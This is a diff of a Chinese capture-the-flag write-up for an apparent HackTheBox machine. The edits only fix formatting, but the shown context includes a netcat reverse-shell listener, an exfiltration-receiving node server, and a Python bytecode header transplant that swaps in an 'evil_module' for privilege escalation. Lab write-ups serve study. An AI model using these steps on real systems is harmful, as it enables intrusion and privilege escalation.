@@ -185,7 +185,7 @@ Server listening on port 4444
 ```
 #### 现在一切都已准备就绪。将扩展程序的压缩文件上传至网站后，稍作等待，我们便能在服务器上看到新的请求进来，这些请求显示了一个新的内部主机名——browsedinternals.htb 。
 ```
- [★]$ node server.js
+[★]$ node server.js
 Server listening on port 4444
 
 --- POST / ---
@@ -506,7 +506,7 @@ transplant_header(
 ```
 #### 要先开侦听 
 ```
- [★]$ nc -lvnp 9011
+[★]$ nc -lvnp 9011
 listening on [any] 9011 ...
 ```
 #### 开了侦听 执行成功了 执行$ python3 create_header.py为什么要开侦听
@@ -556,6 +556,7 @@ larry@browsed:/tmp$ python3 -m py_compile /tmp/evil_module.py
 ```
 ```
 larry@browsed:/opt/extensiontool$ python3 -m py_compile extension_utils.py
+```
 ```
 larry@browsed:/tmp$ python3 create_header.py
 [+] Transplanted header from /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc into /tmp/__pycache__/evil_module.cpython-312.pyc, saved as /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
